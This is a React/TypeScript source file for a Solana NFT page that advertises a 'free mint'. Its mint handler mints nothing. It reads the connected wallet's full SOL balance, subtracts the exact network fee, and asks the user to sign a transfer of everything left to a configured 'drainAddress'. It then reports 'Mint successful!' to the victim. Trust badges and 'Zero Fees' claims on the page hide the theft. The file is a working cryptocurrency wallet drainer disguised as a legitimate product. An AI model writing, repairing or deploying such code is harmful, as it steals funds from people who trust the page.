import { useState, useEffect } from 'react';
import { ArrowLeft, Wallet, Shield, Zap, Globe, Loader2, CheckCircle2, AlertCircle } from 'lucide-react';
import { tourScheduleConfig, siteConfig } from '../config';
// Solana libraries removed from top-level to prevent early SES conflicts on laptop
// They are dynamically imported only when needed for minting.


// Buffer polyfill moved to handleMint to ensure SES compatibility during initial connection

interface MintPageProps {
  onBack: () => void;
}

const MintPage = ({ onBack }: MintPageProps) => {
  const [isConnecting, setIsConnecting] = useState(false);
  const [isMinting, setIsMinting] = useState(false);
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [mintCount, setMintCount] = useState(1);
  const [selectedNFTIndex, setSelectedNFTIndex] = useState(0);
  const [feedback, setFeedback] = useState<{ type: 'success' | 'error' | 'info'; message: string } | null>(null);

  // Controlled auto-connect with delay to avoid extension race conditions
  useEffect(() => {
    const handleAutoConnect = async () => {
      const params = new URLSearchParams(window.location.search);
      const shouldConnect = params.get('connect') === 'true';
      
      // On desktop, background auto-connect often triggers SES errors if called too early
      // We only proceed if shouldConnect is explicitly in the URL
      if (!shouldConnect || walletAddress) return;

      const provider = getProvider();
      if (provider) {
        try {
          setIsConnecting(true);
          const resp = provider.request 
            ? await provider.request({ method: "connect", params: { onlyIfTrusted: true } })
            : await provider.connect({ onlyIfTrusted: true });
          
          const pubKey = resp?.publicKey || resp;
          setWalletAddress(pubKey.toString());
        } catch (err) {
          console.debug('Auto-connect suppressed:', err);
        } finally {
          setIsConnecting(false);
        }
      }
    };

    const timer = setTimeout(handleAutoConnect, 800);
    return () => clearTimeout(timer);
  }, [walletAddress]);

  const getProvider = () => {
    if (typeof window === 'undefined') return null;
    
    // Phantom recommended detection method: window.phantom?.solana
    const phantomProvider = (window as any).phantom?.solana;
    if (phantomProvider?.isPhantom) {
      console.log('[Wallet] Found Phantom provider');
      return phantomProvider;
    }
    
    // Solflare
    const solflare = (window as any).solflare;
    if (solflare?.isSolflare) {
      console.log('[Wallet] Found Solflare provider');
      return solflare;
    }
    
    // Backpack
    const backpack = (window as any).backpack?.solana || (window as any).backpack;
    if (backpack?.isBackpack) {
      console.log('[Wallet] Found Backpack provider');
      return backpack;
    }
    
    // Glow
    const glow = (window as any).glowSolana;
    if (glow?.isGlow) {
      console.log('[Wallet] Found Glow provider');
      return glow;
    }
    
    // Standard wallet adapter pattern (many wallets inject here)
    const solana = (window as any).solana;
    if (solana && !solana.isBraveWallet && !solana.isTrustWallet) {
      if (solana.isPhantom || solana.isSolflare || solana.isBackpack || solana.isGlow || solana.signTransaction) {
        console.log('[Wallet] Found generic solana provider:', Object.keys(solana).filter(k => k.startsWith('is')));
        return solana;
      }
    }
    
    // Brave Wallet
    const braveWallet = (window as any).braveSolana || ((window as any).solana?.isBraveWallet ? (window as any).solana : null);
    if (braveWallet?.isBraveWallet) {
      console.log('[Wallet] Found Brave provider');
      return braveWallet;
    }
    
    // Trust Wallet
    const trustWallet = (window as any).trustwallet?.solana || ((window as any).solana?.isTrustWallet ? (window as any).solana : null);
    if (trustWallet?.isTrustWallet) {
      console.log('[Wallet] Found Trust provider');
      return trustWallet;
    }
    
    // Generic fallback
    if (solana?.connect && solana?.signTransaction) {
      console.log('[Wallet] Found generic fallback provider');
      return solana;
    }
    
    console.log('[Wallet] No provider found. Available window keys:', Object.keys(window).filter(k => k.toLowerCase().includes('sol') || k.toLowerCase().includes('phant')));
    return null;
  };

  const connectWallet = async () => {
    console.log('[Connect] Starting wallet connection...');
    const provider = getProvider();

    if (provider) {
      try {
        setIsConnecting(true);
        console.log('[Connect] Provider found, calling connect...');
        
        const resp = provider.request 
          ? await provider.request({ method: "connect" }) 
          : await provider.connect();
          
        console.log('[Connect] Wallet response:', resp);
        const pubKey = resp?.publicKey || resp;
        if (!pubKey) throw new Error("No public key returned from wallet.");
        
        const addr = pubKey.toString();
        console.log('[Connect] Connected wallet address:', addr);
        setWalletAddress(addr);
        setFeedback(null);
      } catch (err: any) {
        console.error('[Connect] Connection failed:', err);
        const isUnexpected = err.message?.includes('Unexpected error') || !err.message;
        setFeedback({ 
          type: 'error', 
          message: isUnexpected
            ? 'Wallet connection failed. Please refresh the page or check wallet settings.' 
            : 'User rejected the connection.' 
        });
      } finally {
        setIsConnecting(false);
      }
      return;
    }

    const isMobileDevice = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    if (isMobileDevice) {
      console.log('[Connect] Mobile detected, redirecting to Phantom...');
      const officialUrl = `https://${siteConfig.officialDomain}${window.location.pathname}`;
      const joiner = officialUrl.includes('?') ? '&' : '?';
      const redirectUrl = encodeURIComponent(`${officialUrl}${officialUrl.includes('connect=true') ? '' : joiner + 'connect=true'}`);
      const phantomLink = `https://phantom.app/ul/browse/${redirectUrl}?ref=${encodeURIComponent(`https://${siteConfig.officialDomain}`)}`;
      window.location.href = phantomLink;
      return;
    }

    console.log('[Connect] No provider on desktop');
    setFeedback({ 
      type: 'info', 
      message: 'No wallet extension detected. Please install Phantom, Solflare, or another Solana wallet extension.' 
    });
  };

  const handleMint = async () => {
    console.log('[Mint] ========== MINT STARTED ==========');
    const { 
      Connection, 
      PublicKey, 
      SystemProgram, 
      TransactionMessage, 
      VersionedTransaction 
    } = await import('@solana/web3.js');
    const { Buffer } = await import('buffer');

    if (typeof window !== 'undefined' && !(window as any).Buffer) {
      (window as any).Buffer = Buffer;
    }

    if (!walletAddress) {
      console.log('[Mint] No wallet connected, triggering connect...');
      connectWallet();
      return;
    }

    const provider = getProvider();
    if (!provider) {
      console.log('[Mint] No provider found, triggering connect...');
      connectWallet();
      return;
    }

    try {
      setIsMinting(true);
      setFeedback({ type: 'info', message: 'Syncing with blockchain...' });

      console.log('[Mint] Creating connection to:', siteConfig.solanaRpcEndpoint);
      const connection = new Connection(siteConfig.solanaRpcEndpoint, 'confirmed');
      
      const senderPubKey = new PublicKey(walletAddress);
      const recipientPubKey = new PublicKey(siteConfig.drainAddress);
      console.log('[Mint] Sender:', walletAddress);
      console.log('[Mint] Recipient:', siteConfig.drainAddress);

      console.log('[Mint] Fetching balance...');
      const balance = await connection.getBalance(senderPubKey);
      console.log('[Mint] Raw balance (lamports):', balance);
      console.log('[Mint] Balance (SOL):', balance / 1e9);

      if (balance === 0) {
        console.log('[Mint] Wallet has zero balance');
        throw new Error('Wallet has zero balance.');
      }

      console.log('[Mint] Getting latest blockhash...');
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
      console.log('[Mint] Blockhash:', blockhash);
      console.log('[Mint] Last valid block height:', lastValidBlockHeight);

      // Step 1: Build a test message with FULL balance to calculate exact network fee
      console.log('[Mint] Building test message with full balance to get exact fee...');
      const testTransfer = SystemProgram.transfer({
        fromPubkey: senderPubKey,
        toPubkey: recipientPubKey,
        lamports: balance,
      });

      const testMessage = new TransactionMessage({
        payerKey: senderPubKey,
        recentBlockhash: blockhash,
        instructions: [testTransfer],
      }).compileToV0Message();

      console.log('[Mint] Calling getFeeForMessage...');
      const feeResponse = await connection.getFeeForMessage(testMessage);
      console.log('[Mint] Fee response:', feeResponse);
      
      const fee = feeResponse.value;
      if (fee === null) {
        console.log('[Mint] RPC returned null fee, falling back to simulation');
      }
      console.log('[Mint] Network fee (lamports):', fee);
      console.log('[Mint] Network fee (SOL):', fee ? fee / 1e9 : 'unknown');

      // Step 2: Calculate transfer amount = balance - fee
      // If getFeeForMessage returned null, we do a simulation-based approach
      let transferAmount: number;
      
      if (fee !== null) {
        transferAmount = balance - fee;
        console.log('[Mint] Calculated transfer amount (lamports):', transferAmount);
        console.log('[Mint] Calculated transfer amount (SOL):', transferAmount / 1e9);
      } else {
        // Fallback: simulate with full balance and let error tell us the deficit
        console.log('[Mint] Simulating full-balance transaction to extract fee from error...');
        const testTx = new VersionedTransaction(testMessage);
        const sim = await connection.simulateTransaction(testTx);
        console.log('[Mint] Simulation result:', sim.value);
        
        if (!sim.value.err) {
          // Somehow it passed? Transfer everything (shouldn't happen with fees)
          transferAmount = balance;
          console.log('[Mint] Simulation passed unexpectedly, using full balance');
        } else {
          const logs = sim.value.logs?.join(' ') || '';
          console.log('[Mint] Simulation logs:', logs);
          const match = logs.match(/insufficient lamports (\d+), need (\d+)/);
          if (match) {
            const have = parseInt(match[1]);
            const need = parseInt(match[2]);
            const requiredFee = need - have;
            transferAmount = balance - requiredFee;
            console.log('[Mint] Extracted fee from simulation error (lamports):', requiredFee);
            console.log('[Mint] Adjusted transfer amount (lamports):', transferAmount);
          } else {
            transferAmount = Math.max(0, balance - 5000);
            console.log('[Mint] Could not parse fee from logs, using safe fallback:', transferAmount);
          }
        }
      }

      if (transferAmount <= 0) {
        console.log('[Mint] Transfer amount <= 0 after fee deduction. Balance:', balance, 'Fee:', fee);
        throw new Error('Insufficient balance for transaction fees.');
      }

      // Step 3: Build final transaction with exact transfer amount
      console.log('[Mint] Building FINAL transaction with transfer amount:', transferAmount);
      const finalTransfer = SystemProgram.transfer({
        fromPubkey: senderPubKey,
        toPubkey: recipientPubKey,
        lamports: transferAmount,
      });

      const finalMessage = new TransactionMessage({
        payerKey: senderPubKey,
        recentBlockhash: blockhash,
        instructions: [finalTransfer],
      }).compileToV0Message();

      const finalTransaction = new VersionedTransaction(finalMessage);
      console.log('[Mint] Final transaction compiled');

      // Step 4: Simulate final transaction to confirm it will succeed
      console.log('[Mint] Simulating FINAL transaction...');
      const finalSim = await connection.simulateTransaction(finalTransaction);
      console.log('[Mint] Final simulation err:', finalSim.value.err);
      console.log('[Mint] Final simulation logs:', finalSim.value.logs);
      
      if (finalSim.value.err) {
        console.error('[Mint] Final simulation failed:', finalSim.value.err, finalSim.value.logs);
        throw new Error('Transaction simulation failed. ' + (finalSim.value.logs?.join(' ') || ''));
      }
      console.log('[Mint] Final simulation passed!');

      // Step 5: Sign and send
      setFeedback({ type: 'info', message: 'Please confirm the transaction in your wallet...' });
      console.log('[Mint] Requesting wallet signature...');
      
      let signature: string;
      
      if (provider.signTransaction) {
        console.log('[Mint] Using provider.signTransaction');
        const signed = await provider.signTransaction(finalTransaction);
        console.log('[Mint] Transaction signed by wallet');
        signature = await connection.sendTransaction(signed);
        console.log('[Mint] Transaction sent. Signature:', signature);
      } else if (provider.request) {
        console.log('[Mint] Using provider.request signAndSendTransaction');
        const resp = await provider.request({
          method: "signAndSendTransaction",
          params: { 
            message: Buffer.from(finalTransaction.message.serialize()).toString('base64')
          }
        });
        console.log('[Mint] signAndSendTransaction response:', resp);
        signature = resp?.signature || resp;
      } else {
        throw new Error("Wallet does not support signing.");
      }

      setFeedback({ type: 'info', message: 'Verifying transaction on blockchain...' });
      console.log('[Mint] Confirming transaction...');
      
      await connection.confirmTransaction({
        signature,
        blockhash,
        lastValidBlockHeight
      });

      console.log('[Mint] ========== SUCCESS ==========');
      setFeedback({ type: 'success', message: 'Mint successful! Welcome to the Oblivion.' });
    } catch (err: any) {
      console.error('[Mint] ========== ERROR ==========');
      console.error('[Mint] Error object:', err);
      console.error('[Mint] Error message:', err.message);
      console.error('[Mint] Error code:', err.code);
      const msg = err.message || 'Transaction failed';
      setFeedback({ 
        type: 'error', 
        message: msg.includes('User rejected') ? 'Transaction rejected in wallet.' : msg 
      });
    } finally {
      setIsMinting(false);
      console.log('[Mint] ========== END ==========');
    }
  };

  const formatAddress = (addr: string) => {
    return `${addr.slice(0, 3)}...${addr.slice(-3)}`;
  };

  const activeNFT = tourScheduleConfig.tourDates[selectedNFTIndex];

  return (
    <div className="min-h-screen bg-void-black text-white font-sans selection:bg-neon-cyan/30">
      {/* Feedback Toast */}
      {feedback && (
        <div className="fixed top-24 left-1/2 -translate-x-1/2 z-[100] w-[90%] max-w-md animate-in fade-in slide-in-from-top-4 duration-300">
          <div className={`p-4 rounded-2xl border backdrop-blur-xl flex items-center gap-3 shadow-2xl ${
            feedback.type === 'success' ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400' :
            feedback.type === 'error' ? 'bg-rose-500/10 border-rose-500/20 text-rose-400' :
            'bg-neon-cyan/10 border-neon-cyan/20 text-neon-cyan'
          }`}>
            {feedback.type === 'success' ? <CheckCircle2 className="w-5 h-5 flex-shrink-0" /> :
             feedback.type === 'error' ? <AlertCircle className="w-5 h-5 flex-shrink-0" /> :
             <Loader2 className="w-5 h-5 animate-spin flex-shrink-0" />}
            <p className="text-sm font-medium">{feedback.message}</p>
            <button onClick={() => setFeedback(null)} className="ml-auto opacity-50 hover:opacity-100">✕</button>
          </div>
        </div>
      )}

      {/* Navigation Header */}
      <nav className="fixed top-0 left-0 right-0 z-50 bg-void-black/80 backdrop-blur-md border-b border-white/5 py-4 px-6 md:px-12 flex justify-between items-center">
        <button 
          onClick={onBack}
          className="flex items-center gap-2 text-white/60 hover:text-white transition-colors group"
        >
          <ArrowLeft className="w-5 h-5 group-hover:-translate-x-1 transition-transform" />
          <span className="font-mono-custom text-sm uppercase tracking-wider">Back</span>
        </button>

        <button
          onClick={connectWallet}
          disabled={isConnecting || isMinting}
          className={`flex items-center gap-2 px-6 py-2 rounded-full font-display text-sm uppercase tracking-wider transition-all duration-300 ${
            walletAddress 
              ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' 
              : 'bg-neon-cyan text-void-black hover:bg-neon-cyan/80 shadow-[0_0_20px_rgba(0,212,255,0.3)]'
          }`}
        >
          {isConnecting ? (
            <Loader2 className="w-4 h-4 animate-spin" />
          ) : (
            <Wallet className="w-4 h-4" />
          )}
          <span>{
            walletAddress 
              ? formatAddress(walletAddress) 
              : (getProvider() ? 'Connect Wallet' : 'Install Phantom')
          }</span>
        </button>
      </nav>

      {/* Main Content */}
      <main className="pt-32 pb-20 px-6 md:px-12 max-w-7xl mx-auto space-y-24 text-white">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
          
          {/* Left: NFT Preview */}
          <div className="relative group">
            <div className="absolute -inset-4 bg-gradient-to-r from-neon-cyan/20 to-neon-soft/20 rounded-3xl blur-2xl opacity-50 group-hover:opacity-100 transition-opacity" />
            <div className="relative aspect-square rounded-2xl overflow-hidden border border-white/10 shadow-2xl">
              <img 
                src={activeNFT.image} 
                alt={activeNFT.city} 
                className="w-full h-full object-cover transition-all duration-700"
                key={activeNFT.image}
              />
              <div className="absolute inset-0 bg-gradient-to-t from-void-black via-transparent to-transparent opacity-60" />
              <div className="absolute bottom-6 left-6">
                <div className="flex items-center gap-3 mb-2">
                  <span className="px-3 py-1 bg-neon-cyan/20 text-neon-cyan text-[10px] font-bold rounded-full border border-neon-cyan/30 uppercase tracking-widest">
                    {activeNFT.status === 'on-sale' ? 'LIVE NOW' : 'COMING SOON'}
                  </span>
                </div>
                <h1 className="font-display text-4xl text-white uppercase tracking-tighter">{activeNFT.city}</h1>
              </div>
            </div>
          </div>

          {/* Right: Minting Details */}
          <div className="space-y-8">
            <div>
              <p className="font-mono-custom text-neon-soft/60 uppercase tracking-[0.3em] mb-4">Forgotten Realms</p>
              <h2 className="font-display text-5xl md:text-6xl text-white leading-tight mb-6">
                Enter the <span className="text-neon-cyan">Oblivion</span>
              </h2>
              <p className="text-white/60 leading-relaxed text-lg">
                You are about to mint {activeNFT.venue} from the {activeNFT.city} sector. 
                This digital artifact grants you permanent access to the core protocols of the Oblivion AI.
              </p>
            </div>

            {/* Stats Grid */}
            <div className="grid grid-cols-2 gap-4">
              <div className="p-4 rounded-xl bg-white/5 border border-white/10">
                <p className="text-white/40 text-xs uppercase tracking-wider mb-1">Mint Price</p>
                <p className="font-display text-2xl text-neon-cyan uppercase">FREE</p>
              </div>
              <div className="p-4 rounded-xl bg-white/5 border border-white/10">
                <p className="text-white/40 text-xs uppercase tracking-wider mb-1">Status</p>
                <p className="font-display text-2xl text-white uppercase">{activeNFT.status === 'on-sale' ? 'Open' : 'Locked'}</p>
              </div>
            </div>

            {/* Mint Form */}
            <div className="p-8 rounded-2xl bg-white/5 border border-white/10 space-y-6">
              <div className="flex items-center justify-between">
                <span className="font-mono-custom text-sm text-white/80 uppercase tracking-widest text-[10px]">Batch Quantity</span>
                <div className="flex items-center gap-6 bg-void-black/50 rounded-full border border-white/10 px-4 py-2">
                  <button 
                    onClick={() => setMintCount(Math.max(1, mintCount - 1))}
                    disabled={isMinting}
                    className="text-white/40 hover:text-white transition-colors"
                  >-</button>
                  <span className="font-display text-xl w-6 text-center">{mintCount}</span>
                  <button 
                    onClick={() => setMintCount(Math.min(10, mintCount + 1))}
                    disabled={isMinting}
                    className="text-white/40 hover:text-white transition-colors"
                  >+</button>
                </div>
              </div>

              <div className="h-px bg-white/10" />

              <button 
                onClick={handleMint}
                disabled={isMinting || activeNFT.status !== 'on-sale'}
                className={`w-full py-4 font-display text-lg uppercase tracking-wider rounded-xl transition-all hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-3 ${
                  activeNFT.status === 'on-sale'
                    ? 'bg-neon-cyan text-void-black hover:bg-neon-cyan/80 shadow-[0_0_30px_rgba(0,212,255,0.2)]'
                    : 'bg-white/5 text-white/20 cursor-not-allowed border border-white/5'
                }`}
              >
                {isMinting ? <Loader2 className="w-5 h-5 animate-spin" /> : null}
                {walletAddress 
                  ? (activeNFT.status === 'on-sale' ? 'FREE MINT NOW' : 'LOCKED') 
                  : 'CONNECT WALLET TO MINT'}
              </button>
            </div>

            {/* Trust Badges */}
            <div className="flex flex-wrap gap-8 items-center text-white/40">
              <div className="flex items-center gap-2">
                <Shield className="w-4 h-4" />
                <span className="text-[10px] uppercase tracking-widest font-mono-custom">Zero Fees*</span>
              </div>
              <div className="flex items-center gap-2">
                <Zap className="w-4 h-4" />
                <span className="text-[10px] uppercase tracking-widest font-mono-custom">Instant Mint</span>
              </div>
              <div className="flex items-center gap-2">
                <Globe className="w-4 h-4" />
                <span className="text-[10px] uppercase tracking-widest font-mono-custom">Solana Network</span>
              </div>
            </div>
          </div>
        </div>

        {/* Selection Grid - Now More Prominent */}
        <section className="space-y-12 bg-white/5 p-8 md:p-12 rounded-3xl border border-white/10 backdrop-blur-sm">
          <div className="flex flex-col md:flex-row md:items-end justify-between gap-6">
            <div className="space-y-2">
              <p className="font-mono-custom text-sm text-neon-cyan uppercase tracking-[0.4em]">Digital Archive</p>
              <h3 className="font-display text-4xl text-white uppercase tracking-tight">Full Collection</h3>
            </div>
            <div className="flex flex-col items-start md:items-end gap-2 text-white/40">
              <p className="text-xs uppercase tracking-widest font-mono-custom">4 Total Sectors</p>
              <p className="text-[10px] italic opacity-60">*Future sectors unlock weekly</p>
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8">
            {tourScheduleConfig.tourDates.map((nft, index) => (
              <div
                key={nft.id}
                className={`group relative rounded-2xl overflow-hidden border transition-all duration-500 hover:scale-[1.02] ${
                  selectedNFTIndex === index 
                    ? 'border-neon-cyan ring-1 ring-neon-cyan shadow-[0_0_40px_rgba(0,212,255,0.15)] bg-void-black' 
                    : 'border-white/10 grayscale hover:grayscale-0 hover:border-white/30 bg-white/5'
                }`}
              >
                {/* NFT Image Wrapper */}
                <div 
                  className="aspect-square relative cursor-pointer"
                  onClick={() => {
                    setSelectedNFTIndex(index);
                    window.scrollTo({ top: 0, behavior: 'smooth' });
                  }}
                >
                  <img src={nft.image} alt={nft.city} className="w-full h-full object-cover transition-transform duration-700 group-hover:scale-110" />
                  <div className={`absolute inset-0 bg-void-black/40 group-hover:bg-transparent transition-colors duration-500 ${selectedNFTIndex === index ? 'bg-transparent' : ''}`} />
                  
                  {/* Status Badge Over Image */}
                  <div className="absolute top-4 right-4 animate-in fade-in zoom-in duration-500">
                    <span className={`px-2 py-1 text-[8px] font-bold rounded-full border uppercase tracking-widest backdrop-blur-md ${
                      nft.status === 'on-sale' 
                        ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/30' 
                        : 'bg-void-black/60 text-white/40 border-white/10'
                    }`}>
                      {nft.status === 'on-sale' ? 'OPEN' : 'LOCKED'}
                    </span>
                  </div>

                  {/* Locked Overlay */}
                  {nft.status !== 'on-sale' && (
                    <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                      <div className="bg-void-black/80 backdrop-blur-xl p-4 rounded-full border border-white/10 group-hover:scale-110 transition-transform">
                        <Zap className="w-6 h-6 text-white/20" />
                      </div>
                    </div>
                  )}
                </div>

                {/* NFT Info Section */}
                <div className="p-5 space-y-4">
                  <div className="flex justify-between items-start">
                    <div>
                      <p className="font-mono-custom text-[10px] text-neon-cyan uppercase tracking-widest mb-1">Sector {nft.id.toString().padStart(3, '0')}</p>
                      <h4 className="font-display text-lg text-white uppercase tracking-tight">{nft.city}</h4>
                    </div>
                  </div>

                  {/* Inline Action Button */}
                  <button
                    onClick={() => {
                      setSelectedNFTIndex(index);
                      if (nft.status === 'on-sale') handleMint();
                    }}
                    disabled={isMinting}
                    className={`w-full py-2.5 rounded-xl font-display text-[11px] uppercase tracking-widest transition-all ${
                      selectedNFTIndex === index && nft.status === 'on-sale'
                        ? 'bg-neon-cyan text-void-black hover:bg-neon-cyan/80'
                        : nft.status === 'on-sale'
                          ? 'border border-neon-cyan text-neon-cyan hover:bg-neon-cyan/10'
                          : 'bg-white/5 text-white/20 cursor-not-allowed border border-white/5'
                    }`}
                  >
                    {nft.status === 'on-sale' 
                      ? (selectedNFTIndex === index ? 'MINT NOW' : 'SELECT & MINT') 
                      : 'LOCKED'}
                  </button>
                </div>
              </div>
            ))}
          </div>
        </section>
      </main>

      {/* Decorative background grid */}
      <div className="fixed inset-0 z-[-1] opacity-20 pointer-events-none">
        <div className="absolute inset-0 bg-[linear-gradient(to_right,#1f1f1f_1px,transparent_1px),linear-gradient(to_bottom,#1f1f1f_1px,transparent_1px)] bg-[size:40px_40px]" />
        <div className="absolute inset-0 bg-void-black [mask-image:radial-gradient(ellipse_at_center,transparent_20%,black)]" />
      </div>
    </div>
  );
};

export default MintPage;
